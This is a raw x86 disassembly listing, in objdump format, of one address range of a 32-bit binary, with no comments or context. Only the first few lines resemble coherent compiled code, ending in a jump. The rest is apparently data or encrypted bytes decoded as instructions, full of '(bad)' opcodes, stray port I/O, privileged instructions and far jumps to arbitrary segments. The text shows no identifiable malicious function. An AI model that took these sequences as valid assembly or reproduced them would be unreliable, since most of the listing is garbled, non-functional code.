  40a69d:	add    eax,edi
  40a69f:	cmp    edx,eax
  40a6a1:	jbe    0x40a6b1
  40a6a7:	mov    eax,DWORD PTR [ebp-0x44]
  40a6aa:	xor    eax,esi
  40a6ac:	add    eax,edi
  40a6ae:	mov    DWORD PTR [ebp-0x8],eax
  40a6b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40a6b4:	mov    edx,DWORD PTR [ebp-0x8]
  40a6b7:	xor    eax,esi
  40a6b9:	add    eax,edi
  40a6bb:	imul   eax,edx
  40a6be:	mov    DWORD PTR [ebp-0x8],eax
  40a6c1:	mov    eax,DWORD PTR [ebp-0x38]
  40a6c4:	mov    edx,DWORD PTR [ebp-0x8]
  40a6c7:	jmp    0x40ca23
  40a6cc:	pop    esi
  40a6cd:	inc    esi
  40a6ce:	mov    bl,BYTE PTR [edx+eax*4]
  40a6d1:	mov    al,al
  40a6d3:	clc    
  40a6d4:	jge    0x40a746
  40a6d6:	sub    edx,DWORD PTR [ebp-0x5a31ffd4]
  40a6dc:	xchg   dh,dh
  40a6de:	jp     0x40a75a
  40a6e0:	cmp    ebx,DWORD PTR [edi+0x7a]
  40a6e3:	jp     0x40a69d
  40a6e5:	sahf   
  40a6e6:	test   al,0xc9
  40a6e8:	ret    0xe5c0
  40a6eb:	jl     0x40a671
  40a6ed:	es das 
  40a6ef:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a6f1:	mov    ebp,0x6313c899
  40a6f6:	adc    ebx,eax
  40a6f8:	or     BYTE PTR [ebx+0x68ce3e60],0xff
  40a6ff:	jle    0x40a6d0
  40a701:	cmc    
  40a702:	and    DWORD PTR [edx],ebp
  40a704:	int    0x86
  40a706:	fwait
  40a707:	std    
  40a708:	push   eax
  40a709:	dec    ebp
  40a70a:	jle    0x40a772
  40a70c:	fldl2t 
  40a70e:	inc    esi
  40a70f:	outs   dx,DWORD PTR ds:[esi]
  40a710:	mov    eax,ds:0x55295bd0
  40a715:	imul   ecx,edx,0xadfcc5ef
  40a71b:	fadd   DWORD PTR [edi+0x50]
  40a71e:	xor    cl,0xa7
  40a721:	mov    BYTE PTR [eax+0xa],ch
  40a724:	mov    ebp,0xcecf2cfd
  40a729:	mov    bl,0xd5
  40a72b:	clc    
  40a72c:	pop    esp
  40a72d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a72e:	dec    edx
  40a72f:	mov    bl,0xd1
  40a731:	test   BYTE PTR [esp+ebx*4+0x3f],0x23
  40a736:	sub    al,0x71
  40a739:	inc    eax
  40a73a:	inc    edi
  40a73b:	loope  0x40a79a
  40a73d:	loopne 0x40a732
  40a73f:	adc    BYTE PTR [ebp+eiz*8+0x6e],0xcd
  40a744:	pop    esi
  40a745:	into   
  40a746:	xchg   edi,ebp
  40a748:	popa   
  40a749:	sub    eax,0x3be7f7ff
  40a74e:	sbb    ebp,ebp
  40a750:	sbb    eax,DWORD PTR [ecx]
  40a752:	cmp    ebp,0xd15ecda9
  40a758:	jne    0x40a712
  40a75a:	and    eax,0x4f47039d
  40a75f:	mov    esi,0xff12b442
  40a764:	push   esp
  40a765:	or     esp,edi
  40a767:	icebp  
  40a768:	dec    esi
  40a769:	push   es
  40a76a:	lock stos BYTE PTR es:[edi],al
  40a76c:	mov    al,ds:0x43d050d
  40a771:	fidiv  WORD PTR [edx+0x6b22ddd2]
  40a777:	loop   0x40a734
  40a779:	xor    DWORD PTR [edi-0x50],0x78
  40a77d:	jmp    0x40a73b
  40a77f:	leave  
  40a780:	les    esp,FWORD PTR [edx]
  40a782:	or     dl,dl
  40a784:	outs   dx,DWORD PTR ds:[esi]
  40a785:	push   ebp
  40a786:	xchg   esp,eax
  40a787:	les    ecx,FWORD PTR [ebp+0x1b]
  40a78a:	mov    ecx,DWORD PTR [ecx-0x67977f1a]
  40a790:	xor    eax,0xa0209a50
  40a795:	mov    ds:0xbb7ffcbb,al
  40a79a:	mov    bh,0x3b
  40a79c:	out    dx,eax
  40a79d:	mov    ds:0xfd4441b2,al
  40a7a2:	sub    DWORD PTR [esi],0xa5fada19
  40a7a8:	in     eax,0x7c
  40a7aa:	jns    0x40a808
  40a7ac:	(bad)  
  40a7ad:	nop
  40a7ae:	mov    ds:0xea6686c1,eax
  40a7b3:	sbb    DWORD PTR [edx],ebx
  40a7b5:	shl    BYTE PTR [eax-0x38],1
  40a7b8:	int    0x2a
  40a7ba:	mov    bh,0x61
  40a7bc:	lds    eax,FWORD PTR [ebp+0x6b1eec9f]
  40a7c2:	rcl    bl,0x46
  40a7c5:	outs   dx,DWORD PTR ds:[esi]
  40a7c6:	and    BYTE PTR [eax+ecx*8-0x9255de5],bl
  40a7cd:	fimul  DWORD PTR [edx+ecx*1]
  40a7d0:	mov    bh,0xa9
  40a7d2:	lahf   
  40a7d3:	int3   
  40a7d4:	lahf   
  40a7d5:	push   cs
  40a7d6:	scas   eax,DWORD PTR es:[edi]
  40a7d7:	jmp    0x40a7b0
  40a7d9:	push   ecx
  40a7da:	and    ebx,DWORD PTR [ebp-0x1ce22e6d]
  40a7e0:	push   esp
  40a7e1:	add    eax,0x67affbb7
  40a7e6:	cld    
  40a7e7:	ds aas 
  40a7e9:	sub    DWORD PTR [edx+0x4],ebp
  40a7ec:	nop
  40a7ed:	mov    al,0x89
  40a7ef:	mov    cl,0x88
  40a7f1:	mov    ecx,0x6f82998e
  40a7f6:	jmp    0xa25b:0x96b0ad95
  40a7fd:	xchg   esi,eax
  40a7fe:	fmul   st(6),st
  40a800:	loop   0x40a7b2
  40a802:	jecxz  0x40a788
  40a804:	and    al,0xa0
  40a806:	aam    0xd2
  40a808:	js     0x40a7b9
  40a80a:	jp     0x40a837
  40a80c:	jp     0x40a7fe
  40a80e:	lsl    ecx,WORD PTR [eax-0x62]
  40a812:	ins    BYTE PTR es:[edi],dx
  40a813:	dec    ebx
  40a814:	xor    DWORD PTR [ecx],esp
  40a816:	(bad)  
  40a817:	aam    0x60
  40a819:	pop    edx
  40a81a:	push   ebx
  40a81b:	mov    dl,0x43
  40a81d:	lods   eax,DWORD PTR ds:[esi]
  40a81e:	jmp    0x40a830
  40a820:	fcmovnu st,st(4)
  40a822:	pop    ebx
  40a823:	xor    ch,bl
  40a825:	xchg   ebp,eax
  40a826:	rol    eax,1
  40a828:	dec    esi
  40a829:	or     eax,0x5abb4d03
  40a82e:	and    cl,BYTE PTR [ecx-0xa4e2a72]
  40a834:	or     eax,0x3ab672e2
  40a839:	mov    ds:0x361ff2db,eax
  40a83e:	or     eax,0xba46eff2
  40a843:	(bad)
  40a846:	iret   
  40a847:	jmp    0x80bdce97
  40a84c:	ret    
  40a84d:	add    BYTE PTR [edi+0x16],0xa2
  40a851:	mov    cl,0xb
  40a853:	inc    esp
  40a854:	mov    ch,0x24
  40a856:	inc    esp
  40a857:	fiadd  DWORD PTR [edi+0x2b]
  40a85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a85b:	out    0x4,eax
  40a85d:	mov    al,0x53
  40a85f:	sbb    ebx,DWORD PTR [eax-0x4fa94016]
  40a865:	loop   0x40a82c
  40a867:	cmp    al,0xb4
  40a869:	sbb    eax,0x10f9347
  40a86e:	jmp    0x7d8dbdd7
  40a873:	xor    eax,0x822378e5
  40a878:	mov    ?,WORD PTR [ebp-0x2dfa97c7]
  40a87e:	ss pop ebp
  40a880:	sub    al,0x86
  40a882:	daa    
  40a883:	in     eax,dx
  40a884:	cmp    eax,0xc5ec7b43
  40a889:	aad    0xa3
  40a88b:	fnsave [ecx]
  40a88d:	(bad)  
  40a88e:	cs push esi
  40a890:	ret    0x2d77
  40a893:	ror    DWORD PTR [edi-0x4c9c1ed5],1
  40a899:	mov    eax,ds:0x63d50b9a
  40a89e:	push   0x66acba61
  40a8a3:	jg     0x40a8a3
  40a8a5:	adc    al,0x88
  40a8a7:	ins    DWORD PTR es:[edi],dx
  40a8a8:	sbb    ah,ch
  40a8aa:	xchg   esp,eax
  40a8ab:	sar    DWORD PTR [esi+0x18c534],0xd3
  40a8b2:	sahf   
  40a8b3:	(bad)  es:[edi-0x3918b543]
  40a8ba:	mov    edx,0x53a8bd31
  40a8bf:	jg     0x40a88f
  40a8c1:	aas    
  40a8c2:	jb     0x40a90b
  40a8c4:	scas   al,BYTE PTR es:[edi]
  40a8c5:	mov    edx,0xf83dd90f
  40a8ca:	fdivr  QWORD PTR [edi-0x5453afe6]
  40a8d0:	inc    ebp
  40a8d1:	inc    edx
  40a8d2:	ja     0x40a85e
  40a8d4:	ins    DWORD PTR es:[edi],dx
  40a8d5:	shl    BYTE PTR [ecx+0x2a],cl
  40a8d8:	mov    edx,0x8c4d21ed
  40a8dd:	(bad)  
  40a8de:	cmp    bl,BYTE PTR [ebx+eax*2]
  40a8e1:	xchg   esp,eax
  40a8e2:	(bad)  
  40a8e3:	ins    DWORD PTR es:[edi],dx
  40a8e4:	push   ebx
  40a8e5:	push   ebp
  40a8e6:	ficom  WORD PTR [ebp+ebx*4+0xc9ab584]
  40a8ed:	sub    al,0xd4
  40a8ef:	ror    DWORD PTR [edi+0x70],1
  40a8f2:	jmp    0xcfa6:0x7be7b012
  40a8f9:	enter  0x8ff6,0x7c
  40a8fd:	mov    ?,WORD PTR [edx]
  40a8ff:	or     DWORD PTR [ebx+0x73],edx
  40a902:	or     edi,edx
  40a904:	icebp  
  40a905:	jmp    0x79d3:0x9c223504
  40a90c:	push   eax
  40a90d:	daa    
  40a90e:	or     esp,esp
  40a910:	push   edx
  40a911:	icebp  
  40a912:	dec    ebx
  40a913:	popa   
  40a914:	mov    ch,0xef
  40a916:	jb     0x40a981
  40a918:	lods   eax,DWORD PTR ds:[esi]
  40a919:	(bad)  
  40a91b:	mov    BYTE PTR [ecx],0xf7
  40a91e:	out    dx,eax
  40a91f:	addr16 or eax,0x4107f71a
  40a925:	das    
  40a926:	shl    DWORD PTR [ebp+0x73],cl
  40a929:	jae    0x40a928
  40a92b:	add    eax,ecx
  40a92d:	mov    al,0xfc
  40a92f:	dec    eax
  40a930:	sbb    BYTE PTR [ecx+0x13],dh
  40a933:	dec    esi
  40a934:	ret    
  40a935:	cmp    ebx,edx
  40a937:	xchg   ecx,eax
  40a938:	xor    eax,0x70f032ee
  40a93d:	dec    ecx
  40a93e:	mov    eax,DWORD PTR [esi]
  40a940:	push   es
  40a941:	mov    fs,edx
  40a943:	stos   DWORD PTR es:[edi],eax
  40a944:	push   0xffffffb9
  40a946:	mov    al,0x57
  40a948:	gs dec ecx
  40a94a:	adc    eax,0xa22adcaf
  40a94f:	and    ch,bl
  40a951:	mov    ds:0xaef9cca1,eax
  40a956:	ins    BYTE PTR es:[edi],dx
  40a957:	or     eax,0xe64cc396
  40a95c:	imul   ecx,DWORD PTR [eax],0x9518b695
  40a962:	mov    WORD PTR [esi-0x3bff961e],ds
  40a968:	sti    
  40a969:	pop    ecx
  40a96a:	jle    0x40a9a2
  40a96c:	clc    
  40a96d:	sahf   
  40a96e:	push   ebp
  40a96f:	iret   
  40a970:	add    BYTE PTR [eax+edx*2],dl
  40a973:	(bad)  
  40a974:	xlat   BYTE PTR ds:[ebx]
  40a975:	lock popf 
  40a977:	or     eax,0x2f6f08a1
  40a97c:	mov    eax,0x57e55622
  40a981:	xchg   ecx,eax
  40a982:	mov    ah,0x94
  40a984:	mov    WORD PTR [esi],cs
  40a986:	pop    ecx
  40a987:	lds    ecx,FWORD PTR [ebx+0x71163b62]
  40a98d:	rol    DWORD PTR [ebp+0x37],0x79
  40a991:	fdiv   QWORD PTR [ebx+0x75]
  40a994:	std    
  40a995:	mov    ds:0x1b6771e6,eax
  40a99a:	mov    al,0xa1
  40a99c:	out    dx,al
  40a99d:	shl    BYTE PTR [esi+0x32068983],0x18
  40a9a4:	unpcklps xmm1,xmm6
  40a9a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9a8:	push   es
  40a9a9:	pop    ebx
  40a9aa:	jmp    0x40a9f8
  40a9ac:	cld    
  40a9ad:	iret   
  40a9ae:	push   esi
  40a9af:	jp     0x40a94a
  40a9b1:	icebp  
  40a9b2:	add    al,0x82
  40a9b4:	bound  ebx,QWORD PTR [eax*8-0x695f6bb7]
  40a9bb:	jmp    0x61d5:0x604d648b
  40a9c2:	mov    eax,0x185954
  40a9c7:	push   edi
  40a9c8:	out    dx,eax
  40a9c9:	ret    
  40a9ca:	xor    BYTE PTR [ecx+0x44],dl
  40a9cd:	xor    ebp,DWORD PTR [edx+0x2a]
  40a9d0:	rol    BYTE PTR [eax-0x44],1
  40a9d3:	sub    DWORD PTR [ebp+0x5ad17025],ebx
  40a9d9:	ret    0x7b12
  40a9dc:	pop    ebp
  40a9dd:	push   edx
  40a9de:	pop    eax
  40a9df:	mov    bl,0xa4
  40a9e1:	push   0x35cecca5
  40a9e6:	dec    ebp
  40a9e7:	push   0x75546320
  40a9ec:	out    0x44,eax
  40a9ee:	mov    ebp,0x8a5ec194
  40a9f3:	jp     0x40a97a
  40a9f5:	cmp    edi,DWORD PTR [eax]
  40a9f7:	inc    ecx
  40a9f8:	xor    ch,BYTE PTR [ecx-0x14f422b8]
  40a9fe:	adc    dh,BYTE PTR [esi-0x6d00bc3d]
  40aa04:	test   BYTE PTR [ebx+0x4c],cl
  40aa07:	and    DWORD PTR [edi],esi
  40aa09:	arpl   WORD PTR [ecx],di
  40aa0b:	cmp    DWORD PTR [esi+0x192f8df6],edi
  40aa11:	or     al,0x50
  40aa13:	clc    
  40aa14:	pop    ss
  40aa15:	or     eax,DWORD PTR [edx+0x5eae1d67]
  40aa1b:	cmp    DWORD PTR [esi-0x31],ebp
  40aa1e:	das    
  40aa1f:	or     al,0xce
  40aa21:	cmp    BYTE PTR [ebp-0x227d4f56],bh
  40aa27:	popf   
  40aa28:	and    BYTE PTR [ecx],dl
  40aa2a:	add    dh,BYTE PTR ds:0x7d0ba4ed
  40aa30:	(bad)  
  40aa31:	fsub   QWORD PTR [ecx]
  40aa33:	jecxz  0x40aa7b
  40aa35:	stos   BYTE PTR es:[edi],al
  40aa36:	call   0xb056:0xc6304b59
  40aa3d:	and    DWORD PTR ds:0x114be420,ebp
  40aa43:	imul   ebp,DWORD PTR [eax],0x3f
  40aa46:	ret    0x67e6
  40aa49:	xchg   ecx,eax
  40aa4a:	jmp    0x40aa3e
  40aa4c:	imul   ecx,DWORD PTR [ebx],0x3f
  40aa4f:	dec    esp
  40aa50:	mov    dh,BYTE PTR [ebp-0x24]
  40aa53:	popa   
  40aa54:	jae    0x40aac5
  40aa56:	adc    DWORD PTR [edi],edx
  40aa58:	jge    0x40aa5e
  40aa5a:	(bad)  
  40aa5b:	(bad)  
  40aa5c:	xor    DWORD PTR [ebx+0x6f86fb88],eax
  40aa62:	loope  0x40aa43
  40aa64:	shl    DWORD PTR [eax-0x21],0x53
  40aa68:	nop
  40aa69:	popf   
  40aa6a:	sub    BYTE PTR [edx],cl
  40aa6c:	inc    ecx
  40aa6d:	push   ecx
  40aa6e:	jb     0x40aa61
  40aa70:	cmp    al,ah
  40aa72:	jge    0x40aa12
  40aa74:	hlt    
  40aa75:	mov    ds:0x23b2cff0,al
  40aa7a:	(bad)  
  40aa7b:	push   edx
  40aa7c:	mov    dl,0x14
  40aa7e:	jp     0x40aa4c
  40aa80:	not    esp
  40aa82:	(bad)  
  40aa85:	push   esp
  40aa86:	imul   eax,edx,0x7b0806e4
  40aa8c:	push   eax
  40aa8d:	and    ebx,ebx
  40aa8f:	xchg   ecx,eax
  40aa90:	int    0x5a
  40aa92:	shr    BYTE PTR [edx+0x51],cl
  40aa95:	mov    esi,0x173a9c33
  40aa9a:	inc    edx
  40aa9b:	sbb    cl,BYTE PTR [ecx-0x1266de8b]
  40aaa1:	rol    DWORD PTR [ebx+0x33c0d0d],cl
  40aaa7:	imul   esi,esi,0xe7391003
  40aaad:	dec    DWORD PTR ds:0x1c9884c7
  40aab3:	mov    gs,WORD PTR [edx+0xa246b9a]
  40aab9:	ins    DWORD PTR es:[edi],dx
  40aaba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aabb:	cmc    
  40aabc:	popf   
  40aabd:	pushf  
  40aabe:	cli    
  40aabf:	rcl    BYTE PTR [ebp-0x72],1
  40aac2:	sub    BYTE PTR [edx+0x37266382],dh
  40aac8:	or     DWORD PTR [eax+ebx*2],ebp
  40aacb:	jno    0x40aa58
  40aacd:	push   ss
  40aace:	jb     0x40aaf2
  40aad0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40aad2:	aad    0x75
  40aad4:	mov    edx,0x1c25dd7f
  40aad9:	dec    esi
  40aada:	xchg   ecx,esi
  40aadc:	or     al,0xf9
  40aade:	pop    es
  40aadf:	imul   ebx,DWORD PTR [edx-0x20],0x43
  40aae3:	jnp    0x40aae1
  40aae5:	gs push 0xbc0cd651
  40aaeb:	clc    
  40aaec:	cmp    BYTE PTR [edx+0x36454443],ch
  40aaf2:	(bad)  [edx]
  40aaf4:	stos   BYTE PTR es:[edi],al
  40aaf5:	mov    ecx,0x70e2f8ce
  40aafa:	mov    ebp,edx
  40aafc:	jno    0x40aa96
  40aafe:	xchg   esi,eax
  40aaff:	retf   
  40ab00:	fcomip st,st(6)
  40ab02:	pop    ds
  40ab03:	ja     0x40aa98
  40ab05:	das    
  40ab06:	pop    eax
  40ab07:	int    0x9c
  40ab09:	pop    ecx
  40ab0a:	xchg   esi,eax
  40ab0b:	xor    eax,0xde5c3d6c
  40ab10:	mov    cl,0x70
  40ab12:	pop    ss
  40ab13:	inc    ebx
  40ab14:	frstor [edi+0x713fefab]
  40ab1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab1b:	pusha  
  40ab1c:	ret    0xebea
  40ab1f:	outs   dx,BYTE PTR ds:[esi]
  40ab20:	bound  esi,QWORD PTR [ecx-0x504d471d]
  40ab26:	out    dx,al
  40ab27:	dec    esi
  40ab28:	es dec ebx
  40ab2a:	call   0x7468674
  40ab2f:	mov    bl,0x2b
  40ab31:	mul    BYTE PTR [ecx+edi*2]
  40ab34:	in     al,dx
  40ab35:	das    
  40ab36:	(bad)  
  40ab37:	das    
  40ab38:	xor    BYTE PTR [edx+eiz*2-0x48],dl
  40ab3c:	je     0x40ab0c
  40ab3e:	int    0xef
  40ab40:	fmul   QWORD PTR [esi+0x68]
  40ab43:	mov    edx,0x40d869c2
  40ab48:	arpl   WORD PTR [eax],cx
  40ab4a:	jns    0x40abc5
  40ab4c:	mov    ds:0xf6319dc5,al
  40ab51:	mov    al,0xba
  40ab53:	lahf   
  40ab54:	dec    ebp
  40ab55:	cmp    DWORD PTR [edx+0x67],ecx
  40ab58:	aad    0xaa
  40ab5a:	arpl   WORD PTR [ebx-0x13],sp
  40ab5d:	push   ebx
  40ab5e:	fs rcl edi,1
  40ab61:	ins    BYTE PTR es:[edi],dx
  40ab62:	cmp    eax,0x8a376e71
  40ab67:	xchg   esi,eax
  40ab68:	sub    al,cl
  40ab6a:	fcomp  QWORD PTR [esi-0x58c1ee0]
  40ab70:	mov    ecx,0x87ac82fb
  40ab75:	mov    ch,0x5f
  40ab77:	shl    DWORD PTR [edi-0x2d],0x84
  40ab7b:	aaa    
  40ab7c:	mov    edi,0xc5b6c062
  40ab81:	outs   dx,DWORD PTR ds:[esi]
  40ab82:	sub    edi,eax
  40ab84:	dec    esi
  40ab85:	adc    eax,0x9da33913
  40ab8a:	cmp    BYTE PTR [ebx+0x76976cb4],bh
  40ab90:	or     eax,0xb347691e
  40ab95:	pop    edx
  40ab96:	or     eax,0x65b5ba61
  40ab9b:	mov    bh,BYTE PTR [eax]
  40ab9d:	cmc    
  40ab9e:	push   edi
  40ab9f:	push   ecx
  40aba0:	xor    BYTE PTR [eax+0x42dfbea8],bl
  40aba6:	xchg   esi,eax
  40aba7:	rol    bl,cl
  40aba9:	push   ds
  40abaa:	xchg   ecx,eax
  40abab:	dec    ebx
  40abac:	sub    DWORD PTR [eax+eax*4],edx
  40abaf:	in     al,0x76
  40abb1:	shl    esi,0x20
  40abb4:	stc    
  40abb5:	addr16 inc ebx
  40abb7:	pop    es
  40abb8:	jl     0x40ab4e
  40abba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abbb:	xchg   edx,eax
  40abbc:	test   al,0xf5
  40abbe:	jno    0x40abb0
  40abc0:	mov    ebx,0x878d7959
  40abc5:	stc    
  40abc6:	aas    
  40abc7:	sub    eax,0xb1bb3c56
  40abcc:	outs   dx,BYTE PTR ds:[esi]
  40abcd:	jg     0x40abab
  40abcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abd0:	(bad)  
  40abd1:	(bad)  
  40abd2:	and    al,0x6
  40abd4:	jg     0x40abf8
  40abd6:	push   0xffffff9a
  40abd8:	sub    BYTE PTR [edi+0x29bcd35b],bh
  40abde:	sub    al,0xa1
  40abe0:	and    BYTE PTR [ecx+ecx*2-0x7958757a],cl
  40abe7:	loop   0x40ac0c
  40abe9:	fwait
  40abea:	cmp    al,0xf2
  40abec:	and    cl,bh
  40abee:	sahf   
  40abef:	jns    0x40ac31
  40abf1:	cdq    
  40abf2:	test   BYTE PTR [edx+0x6f0aa946],dl
  40abf8:	cli    
  40abf9:	sub    al,0xc6
  40abfb:	xor    edi,ecx
  40abfd:	fwait
  40abfe:	and    edi,DWORD PTR [edx]
  40ac00:	cmp    al,bl
  40ac02:	sub    eax,0x51a57db8
  40ac07:	mov    edi,0x6d9ad21d
  40ac0c:	pop    ds
  40ac0d:	push   esi
  40ac0e:	dec    ebx
  40ac0f:	cli    
  40ac10:	shl    dl,0xf1
  40ac13:	sbb    DWORD PTR [edi],edx
  40ac15:	adc    DWORD PTR [edi-0x354508e7],esi
  40ac1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac1c:	push   ecx
  40ac1d:	jp     0x40ac66
  40ac1f:	push   esi
  40ac20:	and    BYTE PTR [ecx-0x29f664cf],ah
  40ac26:	push   edi
  40ac27:	inc    esi
  40ac28:	sti    
  40ac29:	mov    edi,ebx
  40ac2b:	nop
  40ac2c:	xchg   ecx,eax
  40ac2d:	cld    
  40ac2e:	pop    esp
  40ac2f:	add    ah,BYTE PTR [ebp+0x687183a6]
  40ac35:	hlt    
  40ac36:	dec    edx
  40ac37:	jno    0x40ac19
  40ac39:	into   
  40ac3a:	cmp    ecx,DWORD PTR [edx-0x22b8f199]
  40ac40:	(bad)  
  40ac41:	sti    
  40ac42:	mov    ah,BYTE PTR [edx]
  40ac44:	ins    DWORD PTR es:[edi],dx
  40ac45:	fs pusha 
  40ac47:	retf   
  40ac48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac49:	(bad)  
  40ac4a:	ficomp WORD PTR [edx]
  40ac4c:	sub    ch,BYTE PTR [edi]
  40ac4e:	inc    ebp
  40ac4f:	inc    ebx
  40ac50:	dec    ebp
  40ac51:	inc    edi
  40ac52:	scas   al,BYTE PTR es:[edi]
  40ac53:	loop   0x40acca
  40ac55:	mov    ch,0x30
  40ac57:	push   esp
  40ac58:	and    dh,BYTE PTR [esp+eax*1+0x6]
  40ac5c:	addps  xmm6,xmm1
  40ac5f:	dec    edi
  40ac60:	mov    bl,0x1c
  40ac62:	hlt    
  40ac63:	add    BYTE PTR [edx+0x432a0f94],ch
  40ac69:	mov    ebp,0xf4a03556
  40ac6e:	sub    al,0xf6
  40ac70:	icebp  
  40ac71:	and    al,0xfc
  40ac73:	jae    0x40acde
  40ac75:	lods   al,BYTE PTR ds:[esi]
  40ac76:	ret    
  40ac77:	xchg   ecx,eax
  40ac78:	mov    al,0x8e
  40ac7a:	inc    eax
  40ac7b:	push   esp
  40ac7c:	and    DWORD PTR [ecx-0x37],edi
  40ac7f:	frstor [esi-0x44b25696]
  40ac85:	mov    esi,0x3da090b1
  40ac8a:	sbb    eax,0x9b9a2e08
  40ac8f:	mov    esi,0xdf7c48d6
  40ac94:	mov    ebx,0x612ff914
  40ac99:	adc    esp,DWORD PTR [edx]
  40ac9b:	dec    esi
  40ac9c:	aad    0x70
  40ac9e:	test   dh,bl
  40aca0:	jmp    0xe9ff:0x4af6c534
  40aca7:	inc    esp
  40aca8:	xor    ebp,DWORD PTR [eax+ebp*8-0x5184aa29]
  40acaf:	mov    edx,0xef59b17e
  40acb4:	imul   bh
  40acb6:	loope  0x40acc1
  40acb8:	vxorps ymm7,ymm4,ymm4
  40acbc:	mov    eax,0xcb31a9a4
  40acc1:	jb     0xe373bc2e
  40acc7:	push   0x962e5998
  40accc:	push   esp
  40accd:	cwde   
  40acce:	mov    cl,0xcf
  40acd0:	imul   ebx,DWORD PTR [ecx-0x7e],0x6d
  40acd4:	adc    ebx,DWORD PTR [edi-0x7d]
  40acd7:	mov    esp,0x13e61bc0
  40acdc:	fsub   QWORD PTR [esi+0x2463afb3]
  40ace2:	pusha  
  40ace3:	ret    
  40ace4:	jno    0x40ace7
  40ace6:	push   ebp
  40ace7:	pusha  
  40ace8:	pop    ecx
  40ace9:	push   ecx
  40acea:	dec    esi
  40aceb:	jbe    0x40ac7c
  40aced:	jmp    DWORD PTR [ebp+esi*4-0x107cf94d]
  40acf4:	jle    0x40ad00
  40acf6:	xor    ecx,ebp
  40acf8:	fisub  DWORD PTR [eax]
  40acfa:	ret    0xcd4a
  40acfd:	loope  0x40acea
  40acff:	or     al,0x60
  40ad01:	cli    
  40ad02:	lds    ecx,FWORD PTR [edi-0x3e223b96]
  40ad08:	add    al,0x9
  40ad0a:	add    dl,dl
  40ad0c:	cmp    eax,0xb7eac389
  40ad11:	xchg   edi,eax
  40ad12:	ficom  WORD PTR [edi+0x40449769]
  40ad18:	cwde   
  40ad19:	cmp    cl,bh
  40ad1b:	sbb    eax,0x3a80990f
  40ad20:	xor    BYTE PTR [ebp-0x3d],al
  40ad23:	repnz outs dx,DWORD PTR ds:[esi]
  40ad25:	mov    bl,0x75
  40ad27:	sbb    al,0x8e
  40ad29:	inc    edi
  40ad2a:	xor    DWORD PTR [esi+0x78],ebx
  40ad2d:	or     edx,DWORD PTR [edi+0x1157ccce]
  40ad33:	cmp    eax,0xc9ae5482
  40ad38:	outs   dx,DWORD PTR ds:[esi]
  40ad39:	adc    eax,0xfbe223a4
  40ad3e:	es scas al,BYTE PTR es:[edi]
  40ad40:	jns    0x40ad49
  40ad42:	sbb    DWORD PTR ds:[ecx+esi*4],esp
  40ad46:	retf   0x248e
  40ad49:	icebp  
  40ad4a:	sti    
  40ad4b:	fmulp  st(6),st
  40ad4d:	add    bh,BYTE PTR [ebp+0x2a]
  40ad50:	xchg   ebx,eax
  40ad51:	or     DWORD PTR [ebp+0x61],edx
  40ad54:	jns    0x40aced
  40ad56:	mov    ebx,0x90e0d80
  40ad5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad5c:	push   eax
  40ad5d:	stos   BYTE PTR es:[edi],al
  40ad5e:	shl    DWORD PTR [esi],1
  40ad60:	jle    0x40adc8
  40ad62:	mov    cl,BYTE PTR ds:0xd58f881b
  40ad68:	cmc    
  40ad69:	in     al,dx
  40ad6a:	in     al,0x9
  40ad6c:	and    DWORD PTR ds:0x2c22a4f,0xffffffce
  40ad73:	cmp    DWORD PTR [edi],ebx
  40ad75:	sbb    eax,DWORD PTR [ebp-0x372f3aac]
  40ad7b:	xor    ah,al
  40ad7d:	cs jg  0x40ad8e
  40ad80:	and    eax,0xb306825c
  40ad85:	adc    DWORD PTR [ebp+0x38],0x7f
  40ad89:	xchg   edi,eax
  40ad8a:	cmp    dh,dh
  40ad8c:	pop    esi
  40ad8d:	jo     0x40ad76
  40ad8f:	in     al,0xc3
  40ad91:	add    al,0x82
  40ad93:	jb     0x40adb9
  40ad95:	je     0x40adc9
  40ad97:	mov    edx,0x590f0803
  40ad9c:	pop    es
  40ad9d:	lods   eax,DWORD PTR ds:[esi]
  40ad9e:	and    al,0x84
  40ada0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada1:	lds    esi,FWORD PTR [eax-0x1d]
  40ada4:	sbb    eax,0x3098b07a
  40ada9:	push   ebx
  40adaa:	xchg   edx,eax
  40adab:	ins    DWORD PTR es:[edi],dx
  40adac:	xor    DWORD PTR [edi+ecx*1-0x39e3145d],ebp
  40adb3:	aas    
  40adb4:	push   ecx
  40adb5:	leave  
  40adb6:	sub    esp,DWORD PTR [edx-0xd]
  40adb9:	scas   eax,DWORD PTR es:[edi]
  40adba:	or     BYTE PTR [ebx],ch
  40adbc:	jecxz  0x40ad4c
  40adbe:	iret   
  40adbf:	adc    esi,edx
  40adc1:	pusha  
  40adc2:	dec    esp
  40adc3:	cmp    al,0x8c
  40adc5:	popf   
  40adc6:	sbb    eax,DWORD PTR [ebp-0x52ced5cf]
  40adcc:	mov    eax,ds:0x25bf1719
  40add1:	jecxz  0x40adf8
  40add3:	add    eax,0xdfc3764d
  40add8:	dec    edx
  40add9:	pop    es
  40adda:	pop    edx
  40addb:	or     eax,edx
  40addd:	or     eax,DWORD PTR [ebp-0xd64fd12]
  40ade3:	in     al,0xc6
  40ade5:	je     0x40adfc
  40ade7:	cmp    eax,DWORD PTR [esi-0x5a]
  40adea:	imul   ebp,DWORD PTR [ebp-0x19],0x8
  40adee:	fs push ebx
  40adf0:	ss jne 0x40ada5
  40adf3:	pop    ds
  40adf4:	dec    eax
  40adf5:	fcom   QWORD PTR [ebx]
  40adf7:	mov    ecx,0xd15a7082
  40adfc:	add    bh,BYTE PTR [edx+0x416b4307]
  40ae02:	pop    eax
  40ae03:	sar    DWORD PTR [ebx],1
  40ae05:	retf   0x39e8
  40ae08:	xlat   BYTE PTR ds:[ebx]
  40ae09:	sbb    DWORD PTR [eax+0x2fc55636],ebp
